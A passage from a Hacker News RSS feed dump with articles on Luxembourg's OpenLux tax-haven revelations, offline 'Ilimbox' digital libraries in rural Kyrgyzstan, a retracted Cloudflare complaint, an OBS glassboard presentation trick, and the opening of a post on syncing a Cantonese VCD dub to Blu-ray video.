international assets held in Luxembourg is a gigantic inventory, including luxurious residences, chalets, yachts, helicopters, private jets and big planes, music catalogues, the rights to images, works of art, in short, the list is endless.</p>          <p>In total, as confirmed by the list of 64,458&nbsp;beneficiaries identified by OpenLux&nbsp;: the Grand Duchy of Luxembourg concentrates a large part of the world’s wealth. It is home to at least 279 of the more than 2,000&nbsp;billionaires listed by <em>Forbes</em> magazine. But also 37 of the 50&nbsp;wealthiest French families, such as the Mulliez, Guerrand-Hermès and Bernard Arnault, who structure their group, their assets and their investments through dozens of Luxembourg holding companies.</p>          <h2>A prime location for tax planning</h2>          <p>There are various reasons for choosing Luxembourg&nbsp;: a central position in the European Union, high-quality financial engineering, financial regulations tailored to business, direct access to the country’s institutions, and political stability. But let there be no mistake&nbsp;: the first reasons are taxation and discretion. They are the result of political choices dating back to the time of former Prime Minister, Jean-Claude Juncker (1995-2013), who later became President of the European Commission.</p>            <p>Luxembourg has certainly turned its back on its former tax rescripts, these ultra- advantageous arrangements granted to large multinationals, following the revelations on the subject in 2014 by the <em>«&nbsp;LuxLeaks&nbsp;»</em> investigation. But it remains a hotbed of tax planning for companies and wealthy individuals through preferential tax regimes. This encourages, in some cases, abuse and, possibly, fraud.</p>          <p>The scale of the financial centre is such that the Grand Duchy seems, moreover, insufficiently equipped to guarantee effective control over all the flows it handles. Its services seem to be more calibrated to the size of the country than to its offshore activity. The trade register has only 59&nbsp;employees to enforce the legal obligation to declare the actual beneficiaries of more than 100.000&nbsp;entities and to carry out an initial control of the declarations. The Financial Sector Supervisory Commission (CSSF) has only 900 employees, even though the financial sector accounts for a quarter of the country’s economy.</p>          <p>Of course, Luxembourg is not the only country to have entered the race for the lowest tax bill. But this is the first time that an investigation has exhaustively documented the phenomenon, through the analysis of the microeconomic fabric of a State.</p>          <blockquote> <p>The many flaws discovered by the OpenLux investigation question the ability of States to effectively monitor their financial ecosystem</p> </blockquote>         <p>This truth operation would not have been possible without a directive voted by the European Union in 2018, which required the creation of public registers of the real owners of companies in all member states. This historic reform came after a decade of financial scandals, culminating in the <em>«&nbsp;Panama papers&nbsp;»</em> in 2016, that revealed the extent of the role played by opaque companies and offshore arrangements in laundering criminal activities, including tax fraud. A decade in which at the same time anti-corruption judges and tax authorities saw their investigations coming up against front companies and front men.</p>            <p>Luxembourg was one of the first to apply the European directive, making its register public in autumn 2019. In a way, it is therefore paying the price of transparency. The many flaws discovered by the OpenLux investigation question the ability of States to effectively monitor their financial ecosystem by guaranteeing the reliability of these registers. For example, almost half of the companies, funds and foundations registered in Luxembourg have no real identifiable beneficiaries to date. However, as the European directive states, <em>«&nbsp;public access to information on the actual recipients allows greater control of information by civil society (…) and helps to preserve confidence in the integrity of commercial transactions and the financial system&nbsp;»</em>.</p>                                 </section>    </article></div>]]>
            </description>
            <link>https://www.lemonde.fr/les-decodeurs/article/2021/02/08/openlux-the-secrets-of-luxembourg-a-tax-haven-at-the-heart-of-europe_6069140_4355770.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26063298</guid>
            <pubDate>Mon, 08 Feb 2021 11:46:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Where the internet was delivered by a donkey]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26063285">thread link</a>) | @donohoe
<br/>
February 8, 2021 | https://restofworld.org/2021/delivering-the-internet-by-donkey/ | <a href="https://web.archive.org/web/*/https://restofworld.org/2021/delivering-the-internet-by-donkey/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

			<!-- Article Start -->
			
<p>Zhazgul Zuridinova hikes for fun almost every month, but trekking the narrow mountain pass to Zardaly, a remote village near Kyrgyzstan’s southwest border, still makes her anxious. The 12-kilometer trail carved through the barren rocks is unpaved and bridged by wooden planks. One misstep could send her tumbling down the steep cliffs, a fate that has befallen many locals over the years.</p>



<p>“Zardaly is a place that no one goes to,” said Zuridinova, a 28-year-old project manager from Bishkek, the capital. “They don’t have the internet or electricity. While all the world is changing, they’re still living in the past, like a hundred years ago.”</p>



<p>It was Zardaly’s isolation that brought Zuridinova, two colleagues, and a donkey there last November. All three are employees of the Internet Society, a nonprofit that builds community broadband networks and teaches digital literacy around the world. Their aim was to bring the internet to the local school’s dozen students — who had been cut off from education during the coronavirus pandemic — using a tissue-box-sized digital library called Ilimbox.&nbsp;</p>



<p>The Ilimbox, whose name translates to “science in a box,” stores 500 books, 250 videos, and 4 million Wikipedia articles in Kyrgyz, Russian, and English. The device is only an interim solution for the lack of an internet connection — a thin facsimile of being online, but it has become a lifeline for students in the most remote areas of Kyrgyzstan, who faced being left behind <a href="https://www.unicef.org/kyrgyzstan/stories/lights-camera-action">when the country moved to e-learning last year</a>.&nbsp;</p>



<p>“It’s a window for a person who wants to access knowledge,” Zuridinova said. “It’s not the door.”</p>



<p>Building internet infrastructure has been a great challenge in Kyrgyzstan, which is further away from an ocean than any other country in the world and is almost entirely mountainous — 94% of the country lies at over 1,000 meters altitude. That makes laying cables expensive and difficult. <a href="https://www.internetworldstats.com/asia.htm#kg">More than 60% of Kyrgyzstan’s population</a> is still not covered by any form of internet, and those with a connection are concentrated in a handful of urban areas.</p>



<p>Talant Sultanov, co-founder of the Internet Society’s Kyrgyzstan chapter, first came across the concept of the “internet-in-a-box” when he attended the 2016 Internet Governance Forum in Mexico. The devices — repositories of downloaded internet content that can be accessed by offline communities — were being used <a href="https://vimeo.com/195038843">to connect indigenous communities in the Yucatán peninsula</a>.</p>



<p>“That’s when it occurred to us that, in Kyrgyzstan, we had a similar situation,” Sultanov said. “And that’s when we decided to also apply this experience in Kyrgyzstan and bring the internet-in-a-box to schools and libraries in remote areas.”</p>



<p>With funding from international organizations and an endorsement from the Ministry of Education, the project team — which most of the time comprised Zuridinova and one other engineer — created an Android app and assembled the boxes using low-cost microcomputers and hard drives. When connected to a power source, the Ilimbox becomes a local Wi-Fi hot spot, which students can use to install the app and download the content stored on the drive. The app also functions as a PDF reader and video player, so there’s no need to download other apps.</p>


    <figure>
      <div>
				<ul>
					<li>		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/Pre-covid-2-40x27.jpg" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/Pre-covid-2-768x432.jpg" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/Pre-covid-2-400x267.jpg 400w, https://restofworld.org/wp-content/uploads/2021/02/Pre-covid-2-600x400.jpg 600w, https://restofworld.org/wp-content/uploads/2021/02/Pre-covid-2-1000x667.jpg 1000w, https://restofworld.org/wp-content/uploads/2021/02/Pre-covid-2-1600x1067.jpg 1600w, " sizes="(max-width: 640px) calc(100vw + 40px), 50vw" alt="">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				
			</figcaption>
		</figure></li><li>		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/Pre-covid-1-40x27.jpg" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/Pre-covid-1-768x432.jpg" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/Pre-covid-1-400x267.jpg 400w, https://restofworld.org/wp-content/uploads/2021/02/Pre-covid-1-600x400.jpg 600w, https://restofworld.org/wp-content/uploads/2021/02/Pre-covid-1-1000x667.jpg 1000w, https://restofworld.org/wp-content/uploads/2021/02/Pre-covid-1-1600x1066.jpg 1600w, https://restofworld.org/wp-content/uploads/2021/02/Pre-covid-1-2800x1866.jpg 2800w, " sizes="(max-width: 640px) calc(100vw + 40px), 50vw" alt="">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				
			</figcaption>
		</figure></li>
				</ul>
			</div>
      <figcaption>Ilimbox becomes a local Wi-Fi hot spot that students can connect to and access over 4 million Wikipedia articles in Kyrgyz, Russian, and English.</figcaption>
    </figure>


<p>Even though there is no data network in rural Kyrgyzstan, many people there have Android smartphones, which are often brought in by Kygrgyz migrant workers living in neighboring countries.&nbsp;</p>



<p>Choosing content was a challenge. Schools in rural Kyrgyzstan have suffered from a lack of textbooks and other learning materials in the local language. Higher education institutions increasingly prefer to use Russian or English. “[Rural schools] have to share books or get worn-out books, if they’re lucky. And oftentimes they don’t even have that,” Sultanov said. That didn’t give the Internet Society much to work with. “There really wasn’t much to choose from, so we were happy just for any content,” Sultanov said. “We’re beggars, not choosers.”</p>



<p>Wikipedia has been a surprisingly important source of their material. There are currently more than 80,000 articles on the Kyrgyz version of the site, the majority of which were written after 2010 in <a href="https://www.opensocietyfoundations.org/voices/und-44">an effort </a><a href="https://www.opensocietyfoundations.org/voices/und-44">organized</a> <a href="https://www.opensocietyfoundations.org/voices/und-44">by Kyrgyzstani social worker Chorobek Saadanbekov</a>, who mobilized academics and college students to translate Wikipedia articles from other languages. Saadanbekov said he was motivated by his own experience of growing up in the countryside and receiving education in only Kyrgyz. “And now I have hopes in our country,” he told <em>Rest of World</em>, “that if you only speak Kyrgyz, you can [still] access knowledge.”&nbsp;</p>



<p>Between 2017 and early 2020, the Internet Society delivered Ilimboxes to around 100 schools across the country. But the urgency of their efforts increased dramatically last March, when the Covid-19 pandemic forced schools across the country to close. In August, the Ministry of Education announced that, of all public schools in Kyrgyzstan, 2,106 were already connected to the internet, while the state-owned telecommunications company was laying fiber optic cables for 11 more. Twenty schools, however, would be left out, either because they had no electricity or there were plans to resettle villagers in the future.</p>



<p>“When we learned that,” Sultanov said, “we took it as a challenge and a goal — that we should definitely go to these villages first.”</p>



<p>The school in Zardaly was on the list. The village has around 100 families but no electricity, fixed internet, or mobile data. On November 2, Zuridinova and two colleagues arrived at Zardaly after hours of driving and walking. They brought with them an Ilimbox, a big solar panel, some batteries, and two solar-powered streetlamps. The digital library was placed in the primary school, the only public institution in the village, and 11 students between 7 and 12 came to learn how to use it.</p>



<p>Many older students already had a smartphone, but the team had learned in advance that the only girl in the school, Raiana, didn’t. So, two weeks before the trip to Zardaly, they posted a request on Facebook asking if someone could donate a used handset. A woman saw the post, cleaned and repaired her phone, and sent it to the Ilimbox team. “Thank you, sister,” said Raiana, holding the phone and the Ilimbox in a video recorded by Zuridinova. “I took the phone. I will study hard.”&nbsp;</p>



<p>In Chakmak-Suu, another village on the list, a cell tower put up four years ago offers relatively stable mobile connections. There, Aitunuk Talaibekova, a 15-year-old student, has been able to send homework to her teachers over WhatsApp and conduct searches on Google. However, most of the information she finds online is in Russian.</p>



<p>Because she reads much quicker in Kyrgyz, her native language, she had to use a physical dictionary to translate material she didn’t understand. The Ilimbox, installed in her school in October, gave her access to all the Krygyz language content scattered around the internet and put it in one place.</p>



<p>“Learning has become more interesting for me,” she told <em>Rest of World</em>. “I used Wikipedia to study the biographies of historical figures, authors, and poets, for example, to find their poems that we had in our lessons.” She also uses it to look up textbooks, so she can help her younger siblings with their homework.</p>



<p>With the last of the remote schools connected in November, the Ilimbox team is now planning to expand the program to include Kyrgyzstan’s <a href="https://www.akdn.org/project/bringing-kindergarten-high-pastures">recently created <em>jailoo</em> kindergartens,</a> which allow thousands of children to receive preschool education while they keep an eye on grazing sheep in the pastures. Zuridinova and her colleagues decided to include the jailoos after realizing that the Ilimboxes could work without access to the electrical grid.</p>



<p>Zuridinova says that, the next time they visit Zardaly, she wants to bring the real internet to the village. “We thought about going there to teach [them] how to use Booking.com for tourists, how to use e-commerce websites,” she said. “Not only bringing the internet there, but also teaching [them] how to use it for work, study, and other things.”</p>
			<!-- Article End -->

		</div></div>]]>
            </description>
            <link>https://restofworld.org/2021/delivering-the-internet-by-donkey/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26063285</guid>
            <pubDate>Mon, 08 Feb 2021 11:44:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Requests dropped when using Cloudflare’s free tier for a commercial project]]>
            </title>
            <description>
<![CDATA[
Score 176 | Comments 119 (<a href="https://news.ycombinator.com/item?id=26063239">thread link</a>) | @pawurb
<br/>
February 8, 2021 | https://pawelurbanek.com/cloudflare-free-plan | <a href="https://web.archive.org/web/*/https://pawelurbanek.com/cloudflare-free-plan">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<div role="main">
<p>
The claims contained in this article were incorrect. After another contact with Cloudflare support, it turned out that the Bot Fight Mode behaves differently for Free and PRO plans. That's what caused the instant improvement after upgrading. Another way to resolve the issues I was experiencing would have been to disable the bot fight mode altogether or add a custom page rule disabling it. My website never experienced any traffic throttling. I've decided to remove the article, to stop spreading the misinformation about CF services.
</p>
</div>
</div></div>]]>
            </description>
            <link>https://pawelurbanek.com/cloudflare-free-plan</link>
            <guid isPermaLink="false">hacker-news-small-sites-26063239</guid>
            <pubDate>Mon, 08 Feb 2021 11:36:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Online glassboard (like Lightboard) but using just free software]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26063177">thread link</a>) | @theBashShell
<br/>
February 8, 2021 | http://blogs.lobsterpot.com.au/2021/01/30/presentation-trickery-online-glassboard-like-lightboard-but-using-just-free-software/ | <a href="https://web.archive.org/web/*/http://blogs.lobsterpot.com.au/2021/01/30/presentation-trickery-online-glassboard-like-lightboard-but-using-just-free-software/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-4134">
	
	<!-- .entry-header -->

	<div>
		
<p>I don't know if you've ever seen me present. I like to use whiteboards or flip charts, and that doesn't necessarily translate well to online presentations.</p>



<p>It was at least ten years ago when I had an idea about giving online presentations with a whiteboard, but where the whiteboard would be between me and the camera. A glassboard rather than a whiteboard, obviously, so that I would still be visible through the glass but not obscuring the text. And the image would be mirrored so that the things I wrote would be readable to the audience, given that I'd be drawing on the other side of it. Recently I've found out this is a real thing called <a rel="noreferrer noopener" aria-label="Lightboard (opens in a new tab)" href="https://library.iated.org/view/KOC2017LIG" target="_blank">Lightboard</a>, using ultra-clear glass and lights to make sure what's drawn glows enough. And considering this seems to have only appeared around 2015 (a good five years after I was musing about the concept), I really should've explored things further. </p>



<figure><img src="https://wiki.nus.edu.sg/download/attachments/135954958/lightboard.jpg?version=1&amp;modificationDate=1458616080983&amp;api=v2" alt=""><figcaption>This picture is from a site belonging to the <a rel="noreferrer noopener" aria-label="National University of Singapore (opens in a new tab)" href="https://wiki.nus.edu.sg/pages/viewpage.action?pageId=135954958" target="_blank">National University of Singapore</a>, but an image search gives plenty of examples</figcaption></figure>



<p>In a world where technical presentations are more online than in-person, I've struggled a bit with how to give my usual style of presentation. I know I could set up something like this, and I've been tempted, but it would be a lot of effort, and it's not exactly portable, and I just haven't (although I know at least one person who has…)</p>



<p>I know what you're thinking – and that's that tools like Teams do have whiteboards in their meetings. That's not what I want though – in those situations the main screen becomes white (or whatever colour the whiteboard background is), and the bit showing me disappears or shrinks to the corner. It's like sharing a screen. And my style isn't just writing on a whiteboard, it's pointing at the whiteboard, it's gesturing, it's all of that stuff that doesn't work if I'm constrained to the corner of the screen. If I had a greenscreen behind me I could do the "weatherperson" trick of moving in front of the screen to point things out, etc, but it's still not quite what I want.</p>



<p>And so I got to thinking about what could be done.</p>



<p>Enter OBS. That free piece of software that many people use now. Plus, from version 26 on, it can act as a Virtual Camera, so that Teams (or Zoom or GoTo or whatever) can show whatever OBS is doing. So if I figured if I could get this to behave the right way, I would be able to use it in live presentations. The button that appeared in version 26 is in the Controls pane in the bottom right of the OBS window. </p>



<figure><img src="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-12.png" alt="" srcset="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-12.png 306w, http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-12-300x162.png 300w" sizes="(max-width: 306px) 100vw, 306px"></figure>



<p>There is no mode where I can just use my stylus to draw on the screen where my face is. At least I don't believe there is, but I found a workaround.</p>



<p>The basic concept here is that I use my webcam as a source, but overlay a window capture from an application where I can draw with my stylus (PowerPoint will do, and is good for other reasons too). Then I set the application's background to a <a rel="noreferrer noopener" aria-label="chroma key (opens in a new tab)" href="https://en.wikipedia.org/wiki/Chroma_key" target="_blank">chroma key</a> colour (like bright green #00FF00) and filter that out like a traditional greenscreen. I stretch that source in OBS bit so that the main drawing area is over my webcam feed, and all the menus and stuff is outside.</p>



<p>To explain with pictures:</p>



<p>I started with a plain PowerPoint presentation and set the background to bright green. I'm going to leave the PowerPoint application in this mode because I find it behaves better. And as I'm about to draw on it with a stylus, I don't want it to do anything weird by switching into 'presenter mode' or 'annotation mode' or anything like that.</p>



<figure><img src="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-2-1024x598.png" alt="" srcset="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-2-1024x598.png 1024w, http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-2-300x175.png 300w, http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-2-768x449.png 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>Then in OBS, with the webcam as the bottom layer of the Sources, I add a Window Capture and use the PowerPoint screen.</p>



<figure><img src="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-1.png" alt="" srcset="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-1.png 483w, http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-1-300x116.png 300w" sizes="(max-width: 483px) 100vw, 483px"></figure>



<p>Now select the WindowCapture and resize it to match the slide to the webcam. This slide is going to disappear though, when we add the filter.</p>



<figure><img src="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/ResizingOBS.gif" alt=""></figure>



<p>Right-clicking on the "Window Capture" source, I can go to Filters and add a Chroma Key filter, using the default Green. You'll notice that the bits that are green in PowerPoint have gone grey, indicating that they'll be invisible.</p>



<figure><img src="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-3.png" alt="" srcset="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-3.png 863w, http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-3-300x263.png 300w, http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-3-768x675.png 768w" sizes="(max-width: 863px) 100vw, 863px"></figure>



<p>Now back in OBS, I see myself again..</p>



<figure><img src="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-4.png" alt="" srcset="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-4.png 975w, http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-4-300x223.png 300w, http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-4-768x572.png 768w" sizes="(max-width: 975px) 100vw, 975px"></figure>



<p>…but when I write in PowerPoint, it appears in front of me. (Oh, because I want to point at the things I draw, I flip the webcam horizontally. You might have noticed the writing on my shirt is backwards.)</p>



<figure><img src="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-5-1024x593.png" alt="" srcset="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-5-1024x593.png 1024w, http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-5-300x174.png 300w, http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-5-768x444.png 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>And it's not just text that works. I can have standard bullet-point text.</p>



<figure><img src="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-6-1024x594.png" alt="" srcset="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-6-1024x594.png 1024w, http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-6-300x174.png 300w, http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-6-768x446.png 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>And I can write in other colours too, just not green.</p>



<p>But that brings me to an interesting set of tricks.</p>



<p>The first one is to grab a screenshot of me on the webcam, and make it very saturated, and green. I can do this using just about any image editing tool. So now I have an image that looks like this.</p>



<figure><img src="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-7.png" alt="" srcset="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-7.png 759w, http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-7-300x169.png 300w" sizes="(max-width: 759px) 100vw, 759px"></figure>



<p>I set this to my PowerPoint background, and I can easily see where I can draw and where I can't (assuming I don't move around too much).</p>



<figure><img src="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-9-1024x614.png" alt="" srcset="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-9-1024x614.png 1024w, http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-9-300x180.png 300w, http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-9-768x461.png 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>I can also add gridlines to help my handwriting stay neater, and help me make sure I don't run out of room.</p>



<p>But in many ways the biggest trick is around the flow of my presentation.</p>



<p>Part of why I use whiteboards and flipcharts is because I feel like they help the audience connect with me better. There's something about writing live that means that people feel like I'm doing it on the fly, being more responsive to how the audience is responding, changing tack as I go. </p>



<p>But it's not like that at all. When I present without slides, or even without a computer, I have to know my material really well. I have to know where I'm going. I don't have the crutch of a slide deck of bullet points. I need to know what I'm planning to write. How I'm going to make the various points. Even how the audience is likely to respond to various things. By knowing the narrative of my presentation really well, it gives me the freedom to move around the content if I feel like I need to, but I have to know my anchor points in my head, because I don't have them on the screen.</p>



<p>So… as long as they're still green, and therefore invisible to the audience, I can indeed have them on the screen now. And whether I use consecutive slides with different colours (first green, then white/black/whatever) to make it look like it's building, or whether I trace over the top using my stylus, I can have all the notes I like – even notes to myself that the audience can't see. I can have as many slides as I want and can move around them just like regular folk do.</p>



<figure><img src="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-11-1024x594.png" alt="" srcset="http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-11-1024x594.png 1024w, http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-11-300x174.png 300w, http://blogs.lobsterpot.com.au/wp-content/uploads/2021/01/image-11-768x445.png 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>When it comes to giving demos, I still need to add a separate screen or do traditional screensharing through Teams or GoTo or Zoom or whatever. But with a bit more effort I could do my demo in the background and still draw over the top. Or get a physical greenscreen behind me so that I can have a solid background or demo screen behind me and still have my drawings in the foreground. This can definitely go a lot further.</p>



<p>But for my whiteboard-based presentations, this should work nicely.</p>



<p><a href="http://twitter.com/rob_farley" target="_blank" rel="noreferrer noopener" aria-label="@rob_farley (opens in a new tab)">@rob_farley</a> </p>



<p>PS: I just made a short video at <a rel="noreferrer noopener" aria-label="https://youtu.be/LdtmEf2XhSU (opens in a new tab)" href="https://youtu.be/LdtmEf2XhSU" target="_blank">https://youtu.be/LdtmEf2XhSU</a> to show drawing on the screen. It would've been better if I had taken a few minutes to sort out my lighting and background, but you can see the rough concept there.</p>
	</div><!-- .entry-content -->

	
	<!-- .entry-footer -->

</article></div>]]>
            </description>
            <link>http://blogs.lobsterpot.com.au/2021/01/30/presentation-trickery-online-glassboard-like-lightboard-but-using-just-free-software/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26063177</guid>
            <pubDate>Mon, 08 Feb 2021 11:25:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Reviving an old VCD dub with Python]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26063097">thread link</a>) | @edent
<br/>
February 8, 2021 | https://jsutton.co.uk/sync-dubs-with-python/ | <a href="https://web.archive.org/web/*/https://jsutton.co.uk/sync-dubs-with-python/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://jsutton.co.uk/content/images/size/w300/2021/02/PXL_20210130_192525870-1.jpg 300w,
                            https://jsutton.co.uk/content/images/size/w600/2021/02/PXL_20210130_192525870-1.jpg 600w,
                            https://jsutton.co.uk/content/images/size/w1000/2021/02/PXL_20210130_192525870-1.jpg 1000w,
                            https://jsutton.co.uk/content/images/size/w2000/2021/02/PXL_20210130_192525870-1.jpg 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://jsutton.co.uk/content/images/size/w2000/2021/02/PXL_20210130_192525870-1.jpg" alt="Reviving an old VCD dub with python">
            </figure>

            <section>
                <div>
                    <p>We have children in the family learning both English and Cantonese simultaneously, a great way to help support this will be to show them films that they will love in their mother tongue, and what better films to show children but films by Studio Ghibli? </p><p>But here's the problem: &nbsp;Studio Ghibli films are in Japanese (naturally), but fortunately they've been translated into many languages and distributed world wide. Even better, they're now even available on Netflix. However, for simplicities sake, you tend to only be able to get the translated version for the country or region that you're living in, so for the UK... English.</p><figure><img src="https://jsutton.co.uk/content/images/2021/02/howl_regions.jpg" alt="" srcset="https://jsutton.co.uk/content/images/size/w600/2021/02/howl_regions.jpg 600w, https://jsutton.co.uk/content/images/size/w1000/2021/02/howl_regions.jpg 1000w, https://jsutton.co.uk/content/images/size/w1600/2021/02/howl_regions.jpg 1600w, https://jsutton.co.uk/content/images/size/w2400/2021/02/howl_regions.jpg 2400w" sizes="(min-width: 720px) 720px"><figcaption>The back of the UK Howl's Moving Castle Blu Ray Case, showing the two language options (English and Japanese) along with the disk regions (2/B).</figcaption></figure><!--kg-card-begin: markdown--><p>You can, if you're lucky, find copies of the Cantonese Blu Ray available to import, but then you usually face two problems:</p>
<ol>
<li>High Price. The English copy of the Spirited Away Blu Ray is about £12 on Amazon UK, but the cantonese import is over £45!</li>
<li>Region Locking. Thankfully Blu Ray only has 3 regions compared to DVD's 6! But it's still a problem if you can afford to import a  blu ray from another contintent. You could then import the relevant player, but that's a lot of wasted cash.</li>
</ol>
<!--kg-card-end: markdown--><figure><img src="https://jsutton.co.uk/content/images/2021/02/Blu-ray-regions_with_key.svg" alt=""><figcaption>Blu Ray Regions: https://en.wikipedia.org/wiki/DVD_region_code</figcaption></figure><figure><img src="https://jsutton.co.uk/content/images/2021/02/spirited_away_cant_amazon.png" alt="" srcset="https://jsutton.co.uk/content/images/size/w600/2021/02/spirited_away_cant_amazon.png 600w, https://jsutton.co.uk/content/images/size/w1000/2021/02/spirited_away_cant_amazon.png 1000w, https://jsutton.co.uk/content/images/2021/02/spirited_away_cant_amazon.png 1431w" sizes="(min-width: 720px) 720px"><figcaption>Spirited Away Cantonese listing on amazon UK</figcaption></figure><p>"Ok", I hear you say, "... but you can just stream these films online now, surely the cantonese dub must be available?". Sadly not, as of 2021, the only way to watch Ghibli films online is on Netflix, and you do have some extra dubs available, but only a tiny fraction of the ones in existence.</p><figure><img src="https://jsutton.co.uk/content/images/2021/02/Screenshot-2021-02-06-at-22.10.24.png" alt="" srcset="https://jsutton.co.uk/content/images/size/w600/2021/02/Screenshot-2021-02-06-at-22.10.24.png 600w, https://jsutton.co.uk/content/images/size/w1000/2021/02/Screenshot-2021-02-06-at-22.10.24.png 1000w, https://jsutton.co.uk/content/images/2021/02/Screenshot-2021-02-06-at-22.10.24.png 1146w" sizes="(min-width: 720px) 720px"><figcaption>The audio tracks available for Howl's Moving castle on Netflix: Arabic, English, Hindi, Japanese and Polish</figcaption></figure><h2 id="as-luck-would-have-it-">As luck would have it...</h2><p>.. a family member had been in Hong Kong back in the mid 2000's and brought back a box set of Studio Ghibli Cantonese dubbed VCDs. Not DVDs, <strong>VCDs</strong>. These seemed to come and go pretty quickly in the west, being replaced by DVDs. In Asia however, VCDs were popular for far longer (<a href="https://en.wikipedia.org/wiki/Video_CD#In_Asia">https://en.wikipedia.org/wiki/Video_CD#In_Asia</a>). VCDs have two main problems when using them in 2021: Firstly, the quality can only be accurately summarised as "<a href="https://knowyourmeme.com/memes/recorded-with-a-potato">Potato</a>". Secondly, because a CD is limited to 700MB, the film has to be split in half across two disks. A bit pants in this modern day and age really!</p><p>But let's not look a gift horse in the mouth, there is definitely something we can do with these!</p><p>I already own almost all of the UK releases of the Ghibli films, so now I had the perfect source material; High Quality video from the Blu Ray versions of the films, along with relatively decent Cantonese dubbing of the same film on VCD. All we need to do is find a way to copy the Cantonese Dub onto the High Quality video...</p><figure><img src="https://jsutton.co.uk/content/images/2021/02/PXL_20210130_192525870.jpg" alt="" srcset="https://jsutton.co.uk/content/images/size/w600/2021/02/PXL_20210130_192525870.jpg 600w, https://jsutton.co.uk/content/images/size/w1000/2021/02/PXL_20210130_192525870.jpg 1000w, https://jsutton.co.uk/content/images/size/w1600/2021/02/PXL_20210130_192525870.jpg 1600w, https://jsutton.co.uk/content/images/size/w2400/2021/02/PXL_20210130_192525870.jpg 2400w" sizes="(min-width: 720px) 720px"><figcaption>The UK Blu Ray &amp; Hong Kong VCD of Howl's Moving Castle</figcaption></figure><h2 id="so-how-do-we-do-this">So how do we do this?</h2><!--kg-card-begin: markdown--><p>My original plan had four simple steps:</p>
<ol>
<li>Rip the Blu Ray and VCD versions to my computer.</li>
<li>Extract the Cantonese Dub from the VCD version.</li>
<li>Add it as a new language track on the extracted mp4.</li>
<li>Enjoy a classic film in a new language on my HD TV.</li>
</ol>
<p>Alas, the best made plans, often go awry..</p>
<ul>
<li>The VCD films are split int two, meaning they need to be re-joined (Nothing a little ffmpeg magic can't do!).</li>
<li>The Join in the middle is sometimes, but not always exact, meaning that there may be milliseconds missing in the middle when compared to the full length film.</li>
<li>The VCD film and Blu Ray films are not entirely identical, the VCDs have a black screen with the name of the local distributor at the start for a few seconds (of varying length).</li>
</ul>
